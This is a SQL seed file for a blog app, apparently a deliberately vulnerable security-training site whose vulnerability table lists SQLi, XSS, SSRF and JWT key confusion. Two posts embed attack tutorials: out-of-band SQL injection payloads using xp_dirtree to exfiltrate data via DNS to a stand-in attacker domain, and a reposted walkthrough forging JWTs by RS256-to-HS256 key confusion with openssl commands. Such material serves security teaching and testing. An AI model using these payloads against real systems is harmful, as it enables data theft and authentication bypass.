insert into blogapp_post (id,title,status,content,creat_time,update_time,images) values (1,'Diversity in Engineering','1','<p>Lorem ipsum dolor sit amet, consectetur adipisicing elit, sed do eiusmod tempor incididunt ut labore et dolore magna aliqua. Ut enim ad minim veniam, quis nostrud exercitation ullamco laboris nisi ut aliquip ex ea commodo consequat.</p><p>Lorem ipsum dolor sit amet, consectetur adipisicing elit, sed do eiusmod tempor incididunt ut labore et dolore magna aliqua. Ut enim ad minim veniam, quis nostrud exercitation ullamco laboris nisi ut aliquip ex ea commodo consequat.</p><h3><strong>Lorem Ipsum Dolor</strong></h3><p>div Lorem ipsum dolor sit amet, consectetur adipisicing elit. Assumenda temporibus iusto voluptates deleniti similique rerum ducimus sint ex odio saepe. Sapiente quae pariatur ratione quis perspiciatis deleniti accusantium</p><p>Lorem ipsum dolor sit amet, consectetur adipisicing elit, sed do eiusmod tempor incididunt ut labore et dolore magna aliqua. Ut enim ad minim veniam, quis nostrud exercitation ullamco laboris nisi ut aliquip.</p><p>Someone famous in <cite>Source Title</cite></p><p>quasi nam. Libero dicta eum recusandae, commodi, ad, autem at ea iusto numquam veritatis, officiis. Accusantium optio minus, voluptatem? Quia reprehenderit, veniam quibusdam provident, fugit iusto ullam voluptas neque soluta adipisci ad.</p>','2016-06-22 19:10:25-07','2016-06-22 19:10:25-07','uploads/2021/05/31/blog-post-3.jpeg') ON CONFLICT DO NOTHING;
insert into blogapp_post (id,title,status,content,creat_time,update_time,images) values (2,'Diversity in Engineering','1','<p>Lorem ipsum dolor sit amet, consectetur adipisicing elit, sed do eiusmod tempor incididunt ut labore et dolore magna aliqua. Ut enim ad minim veniam, quis nostrud exercitation ullamco laboris nisi ut aliquip ex ea commodo consequat.</p><p>Lorem ipsum dolor sit amet, consectetur adipisicing elit, sed do eiusmod tempor incididunt ut labore et dolore magna aliqua. Ut enim ad minim veniam, quis nostrud exercitation ullamco laboris nisi ut aliquip ex ea commodo consequat.</p><h3><strong>Lorem Ipsum Dolor</strong></h3><p>div Lorem ipsum dolor sit amet, consectetur adipisicing elit. Assumenda temporibus iusto voluptates deleniti similique rerum ducimus sint ex odio saepe. Sapiente quae pariatur ratione quis perspiciatis deleniti accusantium</p><p>Lorem ipsum dolor sit amet, consectetur adipisicing elit, sed do eiusmod tempor incididunt ut labore et dolore magna aliqua. Ut enim ad minim veniam, quis nostrud exercitation ullamco laboris nisi ut aliquip.</p><p>Someone famous in <cite>Source Title</cite></p><p>quasi nam. Libero dicta eum recusandae, commodi, ad, autem at ea iusto numquam veritatis, officiis. Accusantium optio minus, voluptatem? Quia reprehenderit, veniam quibusdam provident, fugit iusto ullam voluptas neque soluta adipisci ad.</p>','2016-06-22 19:10:25-07','2016-06-22 19:10:25-07','uploads/2021/05/31/blog-post-1.jpeg') ON CONFLICT DO NOTHING;
insert into blogapp_post (id,title,status,content,creat_time,update_time,images) values (3,'Diversity in Engineering','1','<p>Lorem ipsum dolor sit amet, consectetur adipisicing elit, sed do eiusmod tempor incididunt ut labore et dolore magna aliqua. Ut enim ad minim veniam, quis nostrud exercitation ullamco laboris nisi ut aliquip ex ea commodo consequat.</p><p>Lorem ipsum dolor sit amet, consectetur adipisicing elit, sed do eiusmod tempor incididunt ut labore et dolore magna aliqua. Ut enim ad minim veniam, quis nostrud exercitation ullamco laboris nisi ut aliquip ex ea commodo consequat.</p><h3><strong>Lorem Ipsum Dolor</strong></h3><p>div Lorem ipsum dolor sit amet, consectetur adipisicing elit. Assumenda temporibus iusto voluptates deleniti similique rerum ducimus sint ex odio saepe. Sapiente quae pariatur ratione quis perspiciatis deleniti accusantium</p><p>Lorem ipsum dolor sit amet, consectetur adipisicing elit, sed do eiusmod tempor incididunt ut labore et dolore magna aliqua. Ut enim ad minim veniam, quis nostrud exercitation ullamco laboris nisi ut aliquip.</p><p>Someone famous in <cite>Source Title</cite></p><p>quasi nam. Libero dicta eum recusandae, commodi, ad, autem at ea iusto numquam veritatis, officiis. Accusantium optio minus, voluptatem? Quia reprehenderit, veniam quibusdam provident, fugit iusto ullam voluptas neque soluta adipisci ad.</p>','2016-06-22 19:10:25-07','2016-06-22 19:10:25-07','uploads/2021/05/31/blog-post-4.jpeg') ON CONFLICT DO NOTHING;
insert into blogapp_post (id,title,status,content,creat_time,update_time,images) values (4,'Diversity in Engineering','1','<p>Lorem ipsum dolor sit amet, consectetur adipisicing elit, sed do eiusmod tempor incididunt ut labore et dolore magna aliqua. Ut enim ad minim veniam, quis nostrud exercitation ullamco laboris nisi ut aliquip ex ea commodo consequat.</p><p>Lorem ipsum dolor sit amet, consectetur adipisicing elit, sed do eiusmod tempor incididunt ut labore et dolore magna aliqua. Ut enim ad minim veniam, quis nostrud exercitation ullamco laboris nisi ut aliquip ex ea commodo consequat.</p><h3><strong>Lorem Ipsum Dolor</strong></h3><p>div Lorem ipsum dolor sit amet, consectetur adipisicing elit. Assumenda temporibus iusto voluptates deleniti similique rerum ducimus sint ex odio saepe. Sapiente quae pariatur ratione quis perspiciatis deleniti accusantium</p><p>Lorem ipsum dolor sit amet, consectetur adipisicing elit, sed do eiusmod tempor incididunt ut labore et dolore magna aliqua. Ut enim ad minim veniam, quis nostrud exercitation ullamco laboris nisi ut aliquip.</p><p>Someone famous in <cite>Source Title</cite></p><p>quasi nam. Libero dicta eum recusandae, commodi, ad, autem at ea iusto numquam veritatis, officiis. Accusantium optio minus, voluptatem? Quia reprehenderit, veniam quibusdam provident, fugit iusto ullam voluptas neque soluta adipisci ad.</p>','2016-06-22 19:10:25-07','2016-06-22 19:10:25-07','uploads/2021/05/31/blog-post-4.jpeg') ON CONFLICT DO NOTHING;
insert into blogapp_post (id,title,status,content,creat_time,update_time,images) values ('5','SQL Injection: Out-of-Band Exp','1','<p><strong>This is an advanced SQL Injection (SQLi) post, if you&rsquo;re new to SQLi maybe try this one first:&nbsp;<a href="/sql-injection-basics-and-defence/">Basics and Defence</a></strong></p><p>Recently I had a fairly slow Time-Based SQL injection vulnerability, meaning that I could only pull a single character at a time with SQLmap and each character took around 10 seconds to retrieve. An alternative approach in this situation is to use out-of-band retrieval. &nbsp;This is a concept that can be used when exploiting lots of vulnerabilities such as SQL Injection, Command Injection, Cross-site Scripting and XML External Entity Injection.</p><p>The idea is fairly simple, instead of capturing the data you would like to retrieve and extracting it through Boolean-logic you can request the system to transmit the data over a protocol such as HTTP, SMB or DNS.</p><p>With SQL injection, to perform this kind of exfiltration we can use functions such as:</p><pre>MSSQL: master..xp_dirtreeMySQL: LOAD_FILE()</pre><p>Supplying a hostname to these functions will cause a DNS lookup to occur, if you control the authoritative name server for a domain then you could see this DNS request in the logs of your server. Now at this to the fact that you can dynamically generate the hostname that is to be used, meaning you can smuggle data out in the subdomain of a domain that you control. A point to note though, is that hostnames have restrictions on the types of characters and the lengths of queries, so I recommend combining functions like SUBSTR() and HEX() to ensure that the length does not exceed the maximum allowed in subdomains and hex will encode any characters that cannot be used in a hostname.</p><p>So an example of the most simple payload would be:</p><pre>EXEC master..xp_dirtree &#39;\\\\attacker.example.com\\foo&#39; -- </pre><p>This would cause a DNS lookup to attacker.example.com if the system is vulnerable.</p><p><em>Note:some inline systems may perform a DNS lookup when they spot a hostname like this, so to prevent false positives I recommend &ldquo;breaking&rdquo; the hostname like: &lsquo;\\\\attacker.exa&rsquo;+&rsquo;mple.com\\&rsquo;. So that any detected name lookups must be through SQL-like processing</em></p><p>We can then build up a simple query to exfiltrate some data within a sub-domain of the attacker controlled domain name, such as:</p><pre>declare&nbsp;@q varchar(1024); set&nbsp;@q = &#39;master..xp_dirtree &#39;\\\\&#39; + user_name() + &#39;.attacker.example.com\\foo&#39;; exec(@q)</pre><p>Also bear in mind that &ldquo;labels&rdquo; can be a maximum of 63 characters in length, therefore if your output may exceed this length you can combine it with SUBSTRING like this:</p><pre>declare&nbsp;@q varchar(1024); set&nbsp;@q = &#39;master..xp_dirtree &#39;\\\\&#39; + SUBSTRING(user_name(),1,60) + &#39;.attacker.example.com\\foo&#39;; exec(@q)declare&nbsp;@q varchar(1024); set&nbsp;@q = &#39;master..xp_dirtree &#39;\\\\&#39; + SUBSTRING(user_name(),61,60) + &#39;.attacker.example.com\\foo&#39;; exec(@q)</pre><p>If your output contains characters that are not permitted in a hostname, you can convert it to HEX, using a command such as:</p><pre>CONVERT(VARCHAR(MAX), CONVERT(VARBINARY(MAX), user_name()), 1)</pre><p>Putting that all together we get something like:</p><pre>declare&nbsp;@q varchar(1024); set&nbsp;@q = &#39;master..xp_dirtree &#39;\\\\&#39; + SUBSTRING(CONVERT(VARCHAR(MAX), CONVERT(VARBINARY(MAX), user_name()), 1),1,60) + &#39;.attacker.example.com\\foo&#39;; exec(@q)</pre><p>The above will make a DNS request to something like:</p><pre>0x64626f.attacker.example.com</pre><p>At which point you can simply check the logs of your DNS server and check what the exfiltrated information was!<br />Certainly a lot faster than pulling single characters through time-based inference!<br />&nbsp;</p><p><strong>Read More</strong></p><ul> <li><a href="https://akimbocore.com/article/finding-sql-injection/">Finding SQL Injection</a></li> <li><a href="https://akimbocore.com/article/fixing-sql-injection/">Fixing SQL Injection</a></li> <li><a href="https://akimbocore.com/article/sql-injection-exploitation-error-based/">Error-based Injection</a></li> <li><a href="https://akimbocore.com/article/sql-injection-exploitation-union-based/">Union-based Injection</a></li> <li><a href="https://akimbocore.com/article/sql-injection-exploitation-blind-boolean/">Blind-Boolean Injection</a></li> <li><a href="https://akimbocore.com/article/sql-injection-exploitation-time-based/">Time-based Blind Injection</a></li> <li><a href="https://akimbocore.com/article/sql-injectoin-exploitation-out-of-band/">Out-of-Band SQL Injection Exploitation</a></li></ul>','2021-07-17 17:44:30.640376+00','2021-07-18 17:44:30.640376+00','uploads/2021/07/18/oob-12_jLO3P5m.png') ON CONFLICT DO NOTHING;
insert into blogapp_post (id,title,status,content,creat_time,update_time,images) values ('6','JWT Attack Walk-Through','1','<p>There&rsquo;s a well-known defect [1] with older versions of certain libraries where you can trick a JSON Web Token (JWT) consumer that expects tokens signed using <em>asymmetric</em> cryptography into accepting a <em>symmetrically</em> signed token. This article assumes you&rsquo;re comfortable with JWTs and the theory of this attack, but the nub of it is that by switching the token algorithm from &lsquo;RS&rsquo; to &lsquo;HS&rsquo;, a vulnerable endpoint will use its public key to verify the token in a symmetric way (and being public, that key isn&rsquo;t much of a secret).</p><p>It was only recently that I came across a site (as part of a pentest) that used a public key algorithm to secure its JWTs. As with any crypto, the parties must feed exactly the right bits into the algorithm: a single bit deviation and one party will get a different result to the other. And that&rsquo;s an issue with this attack: if the public key we use to <em>spoof</em> a signature is in any way different to the key the server is using to <em>verify</em> the signature, a vulnerable implementation may go unreported. It&rsquo;s not the key itself of course, but the way it&rsquo;s packaged. Is the server&rsquo;s key encoded in the PEM or DER format? If PEM, are the new lines Windows or *nix style (i.e. <em>0x0A0D</em> or <em>0x0A</em>), are there any empty lines, etc.?</p><p>In general, if an attack fails during a black-box test, there are three possible reasons:</p><ul> <li> <p><span dir="ltr">The target isn&rsquo;t vulnerable;</span></p> </li> <li> <p><span dir="ltr">The target is vulnerable but the attack isn&rsquo;t right;</span></p> </li> <li> <p><span dir="ltr">The target is vulnerable, the attack is right but external factors stop the attack from working.</span></p> </li></ul><p>&nbsp;</p><p>Training and experience mean that we gain greater assurance over our methods and can discount the second possibility. To this end, Sjoerd Langkemper put up a useful demo case of the above JWT vulnerability [2,3]. I obtained his permission to write up a solution that uses OpenSSL to get full visibility of what&rsquo;s happening. Obviously this particular solution won&rsquo;t necessarily be the right one against another server but it&rsquo;s the <em>method</em> that&rsquo;s important here.</p><p>First, let&rsquo;s get a fresh JWT from the demo site:</p><pre>eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiJ9.eyJpc3MiOiJodHRwOlwvXC9kZW1vLnNqb2VyZGxhbmdrZW1wZXIubmxcLyIsImlhdCI6MTU0NzcyOTY2MiwiZXhwIjoxNTQ3NzI5NzgyLCJkYXRhIjp7ImhlbGxvIjoid29ybGQifX0.gTlIh_sPPTh24OApA_w0ZZaiIrMsnl39-B8iFQ-Y9UIxybyFAO3m4rUdR8HUqJayk067SWMrMQ6kOnptcnrJl3w0SmRnQsweeVY4F0kudb_vrGmarAXHLrC6jFRfhOUebL0_uK4RUcajdrF9EQv1cc8DV2LplAuLdAkMU-TdICgAwi3JSrkafrqpFblWJiCiaacXMaz38npNqnN0l3-GqNLqJH4RLfNCWWPAx0w7bMdjv52CbhZUz3yIeUiw9nG2n80nicySLsT1TuA4-B04ngRY0-QLorKdu2MJ1qZz_3yV6at2IIbbtXpBmhtbCxUhVZHoJS2K1qkjeWpjT3h-bg</pre><p>The structure is <em>header.payload.signature</em> with each component base64-encoded using the URL-safe scheme and any padding removed. The header and payload of the above token decodes to:</p><pre>{&quot;typ&quot;:&quot;JWT&quot;,&quot;alg&quot;:&quot;RS256&quot;}.{&quot;iss&quot;:&quot;http:\\\\/\\\\/demo.sjoerdlangkemper.nl\\\\/&quot;,&quot;iat&quot;:1547729662,&quot;exp&quot;:1547729782,&quot;data&quot;:{&quot;hello&quot;:&quot;world&quot;}}</pre><p>Now we change the header <em>alg</em> value to <em>HS256</em>, and the payload to whatever we want &ndash; in this example, the <em>exp</em> and <em>data</em> values:</p><pre>{&quot;typ&quot;:&quot;JWT&quot;,&quot;alg&quot;:&quot;<u>HS256</u>&quot;}.{&quot;iss&quot;:&quot;http:\\\\/\\\\/demo.sjoerdlangkemper.nl\\\\/&quot;,&quot;iat&quot;:1547729662,&quot;exp&quot;:<u>1547799999</u>,&quot;data&quot;:{&quot;NCC&quot;:&quot;test&quot;}}</pre><p>Converting this back to the JWT format, we now have a header and payload ready to go:</p><pre>eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJpc3MiOiJodHRwOlwvXC9kZW1vLnNqb2VyZGxhbmdrZW1wZXIubmxcLyIsImlhdCI6MTU0NzcyOTY2MiwiZXhwIjoxNTQ3Nzk5OTk5LCJkYXRhIjp7Ik5DQyI6InRlc3QifX0</pre><p>All that&rsquo;s missing is the signature, and to calculate that we need the public key the server is using. It could be that this is freely available because, for example, there may be times when users need to verify JWTs issued by the site. Another potential source is the server&rsquo;s TLS certificate, which may be being re-used for JWT operations:</p><pre>openssl s_client -connect &lt;hostname&gt;:443</pre><p>Copy the &ldquo;Server certificate&rdquo; output to a file (e.g. <em>cert.pem</em>) and extract the public key (to a file called <em>key.pem</em>) by running:</p><pre>openssl x509 -in cert.pem -pubkey &ndash;noout &gt; key.pem</pre><p>In the case of a pentest, it would be perfectly reasonable to ask the client about the JWT library and version in use. If known to be vulnerable, or if there&rsquo;s any doubt, the key the server uses for JWT verification could also be requested (after all, it&rsquo;s a <em>public key</em>) to help with assessing whether an exploitable condition exists.</p><p>Fortunately, the public key used by the demo JWT service is made easily available [4] (which we save to a file called <em>key.pem</em>):&nbsp;</p><pre>-----BEGIN PUBLIC KEY-----MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAqi8TnuQBGXOGx/Lfn4JFNYOH2V1qemfs83stWc1ZBQFCQAZmUr/sgbPypYzy229pFl6bGeqpiRHrSufHug7c1LCyalyUEP+OzeqbEhSSuUss/XyfzybIusbqIDEQJ+Yex3CdgwC/hAF3xptV/2t+H6y0Gdh1weVKRM8+QaeWUxMGOgzJYAlUcRAP5dRkEOUtSKHBFOFhEwNBXrfLd76fZXPNgyN0TzNLQjPQOy/tJ/VFq8CQGE4/K5ElRSDlj4kswxonWXYAUVxnqRN1LGHw2G5QRE2D13sKHCC8ZrZXJzj67Hrq5h2SADKzVzhA8AW3WZlPLrlFT3t1+iZ6m+aFKwIDAQAB-----END PUBLIC KEY----</pre><p>Let&rsquo;s turn it into ASCII hex:</p><pre>cat key.pem | xxd -p | tr -d &quot;\\\\n&quot;</pre><p>In this case we get:</p><pre>2d2d2d2d2d424547494e205055424c4943204b45592d2d2d2d2d0a4d494942496a414e42676b71686b6947397730424151454641414f43415138414d49494243674b4341514541716938546e75514247584f47782f4c666e344a460a4e594f4832563171656d6673383373745763315a4251464351415a6d55722f736762507970597a7932323970466c3662476571706952487253756648756737630a314c4379616c795545502b4f7a65716245685353755573732f5879667a79624975736271494445514a2b5965783343646777432f68414633787074562f32742b0a48367930476468317765564b524d382b5161655755784d474f677a4a59416c55635241503564526b454f5574534b4842464f466845774e425872664c643736660a5a58504e67794e30547a4e4c516a50514f792f744a2f5646713843514745342f4b35456c5253446c6a346b7377786f6e575859415556786e71524e314c4748770a32473551524532443133734b484343385a725a584a7a6a36374872713568325341444b7a567a684138415733575a6c504c726c46543374312b695a366d2b61460a4b774944415141420a2d2d2d2d2d454e44205055424c4943204b45592d2d2d2d2d0a</pre><p>By supplying the public key as ASCII hex to our signing operation, we can see and completely control the bytes (as well as handle them in a safe way on the command line). Note, for example, the final new line <em>0x0A</em> in our public key &ndash; does the server&rsquo;s public key include this? Let&rsquo;s assume so in this first attempt. Now let&rsquo;s sign the JWT:</p><pre>echo -n &quot;eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJpc3MiOiJodHRwOlwvXC9kZW1vLnNqb2VyZGxhbmdrZW1wZXIubmxcLyIsImlhdCI6MTU0NzcyOTY2MiwiZXhwIjoxNTQ3Nzk5OTk5LCJkYXRhIjp7Ik5DQyI6InRlc3QifX0&quot; | openssl dgst -sha256 -mac HMAC -macopt hexkey:2d2d2d2d2d424547494e205055424c4943204b45592d2d2d2d2d0a4d494942496a414e42676b71686b6947397730424151454641414f43415138414d49494243674b4341514541716938546e75514247584f47782f4c666e344a460a4e594f4832563171656d6673383373745763315a4251464351415a6d55722f736762507970597a7932323970466c3662476571706952487253756648756737630a314c4379616c795545502b4f7a65716245685353755573732f5879667a79624975736271494445514a2b5965783343646777432f68414633787074562f32742b0a48367930476468317765564b524d382b5161655755784d474f677a4a59416c55635241503564526b454f5574534b4842464f466845774e425872664c643736660a5a58504e67794e30547a4e4c516a50514f792f744a2f5646713843514745342f4b35456c5253446c6a346b7377786f6e575859415556786e71524e314c4748770a32473551524532443133734b484343385a725a584a7a6a36374872713568325341444b7a567a684138415733575a6c504c726c46543374312b695a366d2b61460a4b774944415141420a2d2d2d2d2d454e44205055424c4943204b45592d2d2d2d2d0a</pre><p>The output &ndash; that is, the HMAC signature &ndash; is:</p><pre>db3a1b760eec81e029704691f6780c4d1653d5d91688c24e59891e97342ee59f</pre><p>A one-liner to turn this ASCII hex signature into the JWT format is:</p><pre>python -c &quot;exec(\\&quot;import base64, binascii\\nprint base64.urlsafe_b64encode(binascii.a2b_hex(&#39;db3a1b760eec81e029704691f6780c4d1653d5d91688c24e59891e97342ee59f&#39;)).replace(&#39;=&#39;,&#39;&#39;)\\&quot;)&quot;</pre><p>The output is:</p><pre>2zobdg7sgeApcEaR9ngMTRZT1dkWiMJOWYkelzQu5Z8</pre><p>The crafted JWT is now ready:</p><pre>eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJpc3MiOiJodHRwOlwvXC9kZW1vLnNqb2VyZGxhbmdrZW1wZXIubmxcLyIsImlhdCI6MTU0NzcyOTY2MiwiZXhwIjoxNTQ3Nzk5OTk5LCJkYXRhIjp7Ik5DQyI6InRlc3QifX0.2zobdg7sgeApcEaR9ngMTRZT1dkWiMJOWYkelzQu5Z8</pre><p>When we submit this to the server, it&rsquo;s accepted! (It will fail if you submit it now because it will have expired.)</p><p><img alt="" src="https://www.nccgroup.com/globalassets/our-research/uk/images/jwt-attack-walk-through-image.jpg" style="height:227px; width:515px" /></p><p><em>Figure 1: Crafted JWT accepted</em></p><p>If our public key had been missing the final <em>0x0A</em>, the attack would have failed as we would have calculated a different (invalid) signature. But following such a failure, the method outlined above allows us to try different variations of the public key in a controlled fashion to try to match the server&rsquo;s format. However you may come to test for this vulnerability in the future, and whatever method you actually use, hopefully this post will help to avoid false negatives.</p><p><small><em>This is re-post from the link below</em></small></p><p>[0] <a href="https://www.nccgroup.com/ae/about-us/newsroom-and-events/blogs/2019/january/jwt-attack-walk-through/">https://www.nccgroup.com/ae/about-us/newsroom-and-events/blogs/2019/january/jwt-attack-walk-through/</a></p><p>[1] <a href="https://auth0.com/blog/critical-vulnerabilities-in-json-web-token-libraries//" target="_blank">https://auth0.com/blog/2015/03/31/critical-vulnerabilities-in-json-web-token-libraries/</a></p><p>[2]&nbsp;<a href="https://www.sjoerdlangkemper.nl/2016/09/28/attacking-jwt-authentication/" target="_blank">https://www.sjoerdlangkemper.nl/2016/09/28/attacking-jwt-authentication/</a></p><p>[3]&nbsp;<a href="https://demo.sjoerdlangkemper.nl/jwtdemo/rs256.php" target="_blank">https://demo.sjoerdlangkemper.nl/jwtdemo/rs256.php</a></p><p>[4]&nbsp;<a href="https://demo.sjoerdlangkemper.nl/jwtdemo/public.pem" target="_blank">https://demo.sjoerdlangkemper.nl/jwtdemo/public.pem</a></p><p><strong>Published date:</strong>&nbsp; 24 January 2019</p><p><strong>Written by:</strong>&nbsp; Jerome Smith</p>','2021-07-17 16:48:31.767591+00','2021-07-17 17:40:39.651218+00','uploads/2021/07/17/secure-UI-jwt.jpg') ON CONFLICT DO NOTHING;
insert into blogapp_post_author_id (id,post_id,user_id) values (1,1,2) ON CONFLICT DO NOTHING;
insert into blogapp_post_author_id (id,post_id,user_id) values (2,2,2) ON CONFLICT DO NOTHING;
insert into blogapp_post_author_id (id,post_id,user_id) values (3,3,1) ON CONFLICT DO NOTHING;
insert into blogapp_post_author_id (id,post_id,user_id) values (4,4,1) ON CONFLICT DO NOTHING;
insert into blogapp_post_tags (id,post_id,tags_id) values (1,1,1) ON CONFLICT DO NOTHING;
insert into blogapp_post_tags (id,post_id,tags_id) values (2,2,1) ON CONFLICT DO NOTHING;
insert into blogapp_post_tags (id,post_id,tags_id) values (3,3,2) ON CONFLICT DO NOTHING;
insert into blogapp_post_tags (id,post_id,tags_id) values (4,4,2) ON CONFLICT DO NOTHING;
insert into blogapp_comment (id,content,status,create_time,image,post_id_id,author_id_id,email_id) values (1,'Lorem ipsum dolor sit amet, consectetur adipisicing elit, sed do eiusmod tempor incididunt ut labore et dolore magna aliqua. Ut enim ad minim veniam.',TRUE,'2017-06-22 19:10:25-07','blog-post-4.jpeg','1','2','2') ON CONFLICT DO NOTHING;
insert into blogapp_comment (id,content,status,create_time,image,post_id_id,author_id_id,email_id) values (2,'Lorem ipsum dolor sit amet, consectetur adipisicing elit, sed do eiusmod tempor incididunt ut labore et dolore magna aliqua. Ut enim ad minim veniam.',TRUE,'2017-06-22 19:10:25-07','blog-post-4.jpeg','2','2','2') ON CONFLICT DO NOTHING;
insert into blogapp_comment (id,content,status,create_time,image,post_id_id,author_id_id,email_id) values (3,'Lorem ipsum dolor sit amet, consectetur adipisicing elit, sed do eiusmod tempor incididunt ut labore et dolore magna aliqua. Ut enim ad minim veniam.',TRUE,'2017-06-22 19:10:25-07','blog-post-4.jpeg','3','1','1') ON CONFLICT DO NOTHING;
insert into blogapp_comment (id,content,status,create_time,image,post_id_id,author_id_id,email_id) values (3,'Comment cho vui thoi. Lorem ipsum dolor sit amet, consectetur adipisicing elit, sed do eiusmod tempor incididunt ut labore et dolore magna aliqua.',TRUE,'2017-06-24 19:10:25-07','image comment','4','1','1') ON CONFLICT DO NOTHING;
insert into blogapp_comment (id,content,status,create_time,image,post_id_id,author_id_id,email_id) values (4,'Van la comment. ',TRUE,'2017-06-25 19:10:25-07','image comment','4','1','1') ON CONFLICT DO NOTHING;
insert into blogapp_vul (id,name,status) values (1,'XSS',False) ON CONFLICT DO NOTHING;
insert into blogapp_vul (id,name,status) values (2,'CSRF',False) ON CONFLICT DO NOTHING;
insert into blogapp_vul (id,name,status) values (3,'SSRF',False) ON CONFLICT DO NOTHING;
insert into blogapp_vul (id,name,status) values (4,'SQLI',False) ON CONFLICT DO NOTHING;
insert into blogapp_vul (id,name,status) values (5,'SSTI',False) ON CONFLICT DO NOTHING;
insert into blogapp_vul (id,name,status) values (6,'XXE',False) ON CONFLICT DO NOTHING;
insert into blogapp_vul (id,name,status) values (7,'JWT',False) ON CONFLICT DO NOTHING;
insert into blogapp_vul (id,name,status) values (8,'Broken Authencation',False) ON CONFLICT DO NOTHING;
insert into blogapp_vul (id,name,status) values (9,'Insecure Deserialize',False) ON CONFLICT DO NOTHING;
insert into blogapp_vul (id,name,status) values (10,'Path Travesal',False) ON CONFLICT DO NOTHING;
insert into blogapp_vul (id,name,status) values (11,'JWT_Key_Confusion',False) ON CONFLICT DO NOTHING;
insert into blogapp_vul (id,name,status) values (12,'IDOR',False) ON CONFLICT DO NOTHING;
SELECT pg_catalog.setval(pg_get_serial_sequence('auth_user', 'id'), (SELECT MAX(id) FROM auth_user));
SELECT pg_catalog.setval(pg_get_serial_sequence('blogapp_role', 'id'), (SELECT MAX(id) FROM blogapp_role));
SELECT pg_catalog.setval(pg_get_serial_sequence('blogapp_tags', 'id'), (SELECT MAX(id) FROM blogapp_tags));
SELECT pg_catalog.setval(pg_get_serial_sequence('blogapp_userprofile', 'id'), (SELECT MAX(id) FROM blogapp_userprofile));
SELECT pg_catalog.setval(pg_get_serial_sequence('blogapp_post', 'id'), (SELECT MAX(id) FROM blogapp_post));
SELECT pg_catalog.setval(pg_get_serial_sequence('blogapp_post_author_id', 'id'), (SELECT MAX(id) FROM blogapp_post_author_id));
SELECT pg_catalog.setval(pg_get_serial_sequence('blogapp_post_tags', 'id'), (SELECT MAX(id) FROM blogapp_post_tags));
SELECT pg_catalog.setval(pg_get_serial_sequence('blogapp_comment', 'id'), (SELECT MAX(id) FROM blogapp_comment));
SELECT pg_catalog.setval(pg_get_serial_sequence('blogapp_vul', 'id'), (SELECT MAX(id) FROM blogapp_vul));
